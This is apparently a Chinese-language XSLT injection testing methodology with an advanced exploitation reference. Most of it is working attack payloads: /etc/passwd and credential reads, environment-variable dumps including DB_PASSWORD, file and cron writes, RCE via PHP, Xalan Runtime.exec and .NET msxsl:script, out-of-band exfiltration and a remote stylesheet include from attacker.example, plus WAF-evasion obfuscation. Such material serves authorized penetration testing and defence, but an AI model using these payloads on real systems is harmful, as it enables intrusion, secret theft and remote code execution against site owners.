# xslt-injection

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# XSLT 注入测试方法论


XSLT 注入发生在**攻击者可控的 XSLT** 被服务端编译/执行时。关键是先**识别处理器类型**（Java/.NET/PHP/libxslt），再按平台选择攻击路径。

---

## 0. 快速开始

1. **找到注入点**：参数名含 `xslt`, `stylesheet`, `transform`, `template`、SOAP 样式表、报表生成器、XML→HTML 转换器
2. **探测反射**：注入唯一命名空间或 `xsl:value-of select="'marker'"` — 输出变化则确认执行
3. **指纹识别**处理器（§1）
4. **升级攻击**：**document()**（§2）、**XXE**（§3）、**EXSLT 写文件**（§4）、**PHP RCE**（§5）、**Java RCE**（§6）、**.NET RCE**（§7）

**无害探测 payload**：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. 处理器指纹识别

使用标准 `system-property` 读取：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**指纹对照表**：

| 信号 | 引擎 |
|---|---|
| `Apache Software Foundation` / Xalan 标记 | Xalan（Java） |
| `Saxonica` / Saxon URI | Saxon |
| `libxslt` / GNOME 栈 | libxslt（C，常见于 PHP/nginx） |
| Microsoft URL / MSXML 字符串 | MSXML / .NET XSLT 栈 |

根据结果选择 §5–§7 路径。

---

## 2. 文件读取 — `document()`

`document()` 加载另一个 XML 文档到节点集；本地文件通常按 XML 解析（有噪声），但**错误和部分读取**仍可泄露信息。

**Unix**：
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows**：
```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / 带外**：
```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

如果数据不直接返回客户端，可配合**错误回显**或**时间差**观测。

---

## 3. XXE via XSLT（外部实体）

XSLT 1.0 允许在样式表中使用 **DTD 外部实体**（当解析器允许 DTD 时）：

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

加固的解析器会禁用外部 DTD — 此处失败不代表其他 XSLT 向量（§2）不可用。

---

## 4. 文件写入 — EXSLT (`exslt:document`)

当 **EXSLT common** 扩展启用时：

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**影响**：在路径权限允许的位置任意写文件 — 常可通过 webroot/cron/包含点实现 **RCE**。

---

## 5. RCE — PHP (`php:function`)

需要 PHP XSLT 启用了 `registerPHPFunctions()` 的场景（应用配置不当）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**目录列表**：
```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**危险操作**（仅在实验环境验证）：
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — Webshell 写入
- `php:function('assert', string($payload))` — 旧版 PHP 代码执行

**注意**：现代 PHP 加固通常**阻止**这些；没有 RCE 不代表 `document()`/XXE 不可用。

---

## 6. RCE — Java（Saxon / Xalan 扩展）

Java 引擎可能暴露映射到静态方法的**扩展函数**。

**Xalan 风格**（概念性 — 根据实际版本和扩展绑定调整）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon 风格**：
```
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C whoami')
```

如果扩展被禁用（常见的安全默认配置），转向 **document()**、SSRF 或其他攻击面。

---

## 7. RCE — .NET (`msxsl:script`)

当 Microsoft XSLT **脚本块**启用时：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

默认安全配置通常禁用脚本 — 此路径仅在启用时有效。

---

## 深入参考

- XSLT 高级利用 payload 与引擎特性（XSLT 2.0+/盲利用/WAF 绕过） → [references/xslt-exploitation.md](references/xslt-exploitation.md)

## 8. 决策树

```
用户可控 XSLT 或 XML 转换？
                    |
                   否 → 不在范围
                    |
                   是
                    |
        +-----------+-----------+
        |                       |
   输出反射                   无反射
   注入逻辑？              尝试盲通道
        |                       |
        v                       v
  system-property()        错误/OOB/时间差
  指纹识别引擎                   |
        |                       |
    +---+---+---+           document()
    |       |   |               |
  libxslt Java .NET          SSRF/文件读
    |       |   |               |
 document() Saxon/ msxsl:script? EXSLT?
 EXSLT写   Xalan     |            |
    |     扩展？  C# Process    记录证据
    v       v      v
 文件读/写 rt:exec cmd.exe /c
```

---

## 9. 工具

| 类别 | 工具 |
|---|---|
| 代理/手动 | Burp Suite, OWASP ZAP — 重放样式表 payload，观察响应和错误 |
| XML/XSLT 实验环境 | 匹配目标**完全相同**的处理器（PHP libxslt / Java Saxon 版本 / .NET framework）|
| 带外 | Collaborator / 私有回调服务器用于 `document('http://…')` |

没有通用扫描器能替代**版本特定**的行为验证。


---

## REF: xslt-exploitation

# XSLT 高级利用参考

> 本文档补充 SKILL.md，聚焦高级 payload 变体、XSLT 2.0+ 特性、盲利用与 WAF 绕过。基础知识见主文件。

---

## 1. 识别 — XSLT 版本与引擎能力判断

标准指纹（SKILL.md 已覆盖）之外，可通过**功能探测**进一步确认版本：

```
引擎能力探测树
├─ unparsed-text() 可用？ → XSLT 2.0+（Saxon / 部分 Xalan）
├─ xsl:result-document 可用？ → XSLT 2.0+
├─ xsl:evaluate 可用？ → XSLT 3.0（Saxon 9.8+）
├─ system-property('xsl:product-version') 返回值？
│   ├─ 9.x / 10.x / 11.x / 12.x → Saxon 对应版本
│   └─ 空或无 → libxslt / MSXML（仅 XSLT 1.0）
└─ environment-variable() 可用？ → Saxon（需 PE/EE 或启用扩展）
```

版本探测 payload：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>version=</xsl:text>
    <xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;product=</xsl:text>
    <xsl:value-of select="system-property('xsl:product-name')"/>
    <xsl:text>&#10;product-version=</xsl:text>
    <xsl:value-of select="system-property('xsl:product-version')"/>
    <xsl:text>&#10;schema-aware=</xsl:text>
    <xsl:value-of select="system-property('xsl:is-schema-aware')"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 2. 判断 — 引擎特性矩阵

| 能力 | libxslt (1.0) | Xalan-J (1.0) | Saxon HE (2.0/3.0) | Saxon PE/EE | MSXML/.NET |
|---|---|---|---|---|---|
| unparsed-text() | 不支持 | 不支持 | 支持 | 支持 | 不支持 |
| xsl:result-document | 不支持 | 不支持 | 支持 | 支持 | 不支持 |
| xsl:evaluate | 不支持 | 不支持 | 3.0 起支持 | 3.0 起支持 | 不支持 |
| environment-variable() | 不支持 | 不支持 | 受限 | 支持 | 不支持 |
| exsl:document | 支持 | 部分 | 不常用 | 不常用 | 不支持 |
| redirect:write | 不支持 | 支持 | 不支持 | 不支持 | 不支持 |
| Java 扩展函数 | 不支持 | 默认启用 | 默认禁用 | 可配置 | 不支持 |

---

## 3. 利用 — 高级 Payload 分类

### 3.1 文件读取 — unparsed-text()（XSLT 2.0+）

`document()` 要求目标是合法 XML，而 `unparsed-text()` 可读取**任意文本文件**：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
  </xsl:template>
</xsl:stylesheet>
```

Windows 变体：

```xml
<xsl:value-of select="unparsed-text('file:///C:/Windows/win.ini', 'utf-8')"/>
```

探测文件是否存在（不读取内容，避免大文件阻塞）：

```xml
<xsl:value-of select="unparsed-text-available('/etc/shadow', 'utf-8')"/>
```

### 3.2 文件写入 — xsl:result-document（XSLT 2.0+）

Saxon 处理器支持通过 `xsl:result-document` 将输出写入任意路径：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="file:///tmp/proof.txt" method="text">
      <xsl:text>XSLT_WRITE_PROOF</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

Webshell 落地（写入 web 目录后访问确认）：

```xml
<xsl:result-document href="file:///var/www/html/test.txt" method="text">
  <xsl:text>write_success</xsl:text>
</xsl:result-document>
```

Xalan-J redirect 扩展（替代方案）：

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:redirect="http://xml.apache.org/xalan/redirect"
    extension-element-prefixes="redirect">
  <xsl:template match="/">
    <redirect:write file="/tmp/proof.txt">
      <xsl:text>XALAN_WRITE_PROOF</xsl:text>
    </redirect:write>
  </xsl:template>
</xsl:stylesheet>
```

### 3.3 环境变量读取 — Saxon

Saxon PE/EE 提供 `environment-variable()` 函数：

```xml
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>HOME=</xsl:text>
    <xsl:value-of select="environment-variable('HOME')"/>
    <xsl:text>&#10;PATH=</xsl:text>
    <xsl:value-of select="environment-variable('PATH')"/>
    <xsl:text>&#10;DB_PASSWORD=</xsl:text>
    <xsl:value-of select="environment-variable('DB_PASSWORD')"/>
  </xsl:template>
</xsl:stylesheet>
```

可用 `available-environment-variables()` 枚举所有变量名：

```xml
<xsl:for-each select="available-environment-variables()">
  <xsl:value-of select="."/>
  <xsl:text>=</xsl:text>
  <xsl:value-of select="environment-variable(.)"/>
  <xsl:text>&#10;</xsl:text>
</xsl:for-each>
```

### 3.4 动态表达式执行 — xsl:evaluate（XSLT 3.0）

Saxon 9.8+ 支持运行时 XPath 求值，可绕过静态分析：

```xml
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:evaluate xpath="concat('unparsed-text(', '''', '/etc/passwd', '''', ', ', '''', 'utf-8', '''', ')')"/>
  </xsl:template>
</xsl:stylesheet>
```

### 3.5 盲利用 — 错误信息泄露

当输出不可见时，利用**错误消息**提取数据：

```
盲利用决策树
├─ 有出网能力？
│   ├─ 是 → document('http://attacker.example/?d=' + encode(data))
│   └─ 否 → 走错误泄露
├─ 错误信息回显？
│   ├─ 是 → 构造非法 XPath 将数据嵌入错误
│   └─ 否 → 时间差探测
└─ 时间差可用？
    └─ 用条件循环制造延迟
```

通过故意触发类型错误泄露文件内容：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:variable name="leak" select="unparsed-text('/etc/hostname', 'utf-8')"/>
    <xsl:value-of select="$leak * 1"/>
  </xsl:template>
</xsl:stylesheet>
```

预期错误：`Cannot convert "myhostname" to a double` — 主机名泄露在错误消息中。

OOB 带外数据外传（需出网）：

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:variable name="data" select="unparsed-text('/etc/hostname', 'utf-8')"/>
    <xsl:variable name="exfil" select="document(concat('http://attacker.example/x?d=', encode-for-uri($data)))"/>
  </xsl:template>
</xsl:stylesheet>
```

### 3.6 链式攻击 — 文件读取到 RCE

```
链式攻击路径
├─ Step 1: unparsed-text() 读取应用配置
│   └─ 获取数据库凭据、内部服务地址、密钥
├─ Step 2: xsl:result-document 写入 webshell/cron
│   ├─ 写入 /var/spool/cron/crontabs/www-data
│   ├─ 写入 web 目录下 .php/.jsp 文件
│   └─ 写入应用自动加载路径
├─ Step 3: document() SSRF 触发内部服务
│   └─ 配合读取到的凭据访问内网管理接口
└─ Step 4: 验证执行 → 回调确认
```

Cron 写入示例（Saxon）：

```xml
<xsl:result-document href="file:///var/spool/cron/crontabs/www-data" method="text">
  <xsl:text>* * * * * /bin/bash -c 'id > /tmp/xslt_rce_proof'&#10;</xsl:text>
</xsl:result-document>
```

### 3.7 WAF 绕过技术

**编码混淆**：

```xml
<!-- 使用字符实体绕过关键词检测 -->
<xsl:value-of select="unp&#97;rsed-text('/etc/passwd', 'utf-8')"/>

<!-- 使用 CDATA 包裹敏感路径 -->
<xsl:variable name="path"><![CDATA[/etc/passwd]]></xsl:variable>

<!-- 使用 xsl:variable 间接引用避免直接出现敏感路径 -->
<xsl:variable name="p1" select="'/etc'"/>
<xsl:variable name="p2" select="'/passwd'"/>
<xsl:value-of select="unparsed-text(concat($p1, $p2), 'utf-8')"/>
```

**命名空间混淆**：

```xml
<!-- 使用自定义前缀替代标准 xsl: 前缀 -->
<a:stylesheet version="2.0" xmlns:a="http://www.w3.org/1999/XSL/Transform">
  <a:output method="text"/>
  <a:template match="/">
    <a:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
  </a:template>
</a:stylesheet>
```

**分片 payload**（通过 xsl:include 拆分）：

```xml
<!-- 主文件：看起来无害 -->
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="http://attacker.example/stage2.xsl"/>
  <xsl:template match="/">
    <xsl:call-template name="run"/>
  </xsl:template>
</xsl:stylesheet>
```

**xsl:attribute 动态构造**（绕过静态路径检测）：

```xml
<xsl:variable name="target">
  <xsl:text>file:///</xsl:text>
  <xsl:value-of select="translate('fgd-qbffjq', 'abcdefghijklmnopqrstuvwxyz', 'nopqrstuvwxyzabcdefghijklm')"/>
</xsl:variable>
```

---

## 4. 验证 — 利用确认检查清单

| 阶段 | 验证方式 | 成功标志 |
|---|---|---|
| 文件读取 | unparsed-text() 或 document() 读 /etc/hostname | 返回主机名 |
| 文件写入 | result-document 写 web 目录后 HTTP 访问 | 200 响应含写入内容 |
| 环境变量 | environment-variable('HOME') | 返回路径 |
| OOB 外传 | document() 请求回调服务器 | 收到 HTTP 请求含数据 |
| 盲利用 | 错误消息中包含泄露数据 | 错误内容含文件片段 |
| RCE | 写入 cron/webshell 后回调确认 | 回调服务器收到请求 |

引擎选择 payload 快速参考：

```
确认引擎后选择利用路径
├─ Saxon HE/PE/EE
│   ├─ unparsed-text() → 任意文件读取
│   ├─ xsl:result-document → 文件写入
│   ├─ environment-variable() → 环境变量（PE/EE）
│   └─ xsl:evaluate → 动态 XPath（3.0）
├─ Xalan-J
│   ├─ redirect:write → 文件写入
│   ├─ Java 扩展函数 → Runtime.exec() RCE
│   └─ document() → SSRF / XML 文件读取
├─ libxslt
│   ├─ exsl:document → 文件写入
│   ├─ document() → SSRF / XML 文件读取
│   └─ XXE via DTD → 非 XML 文件读取
└─ MSXML / .NET
    ├─ msxsl:script → C#/VB 代码执行
    └─ document() → 文件读取 / SSRF
```
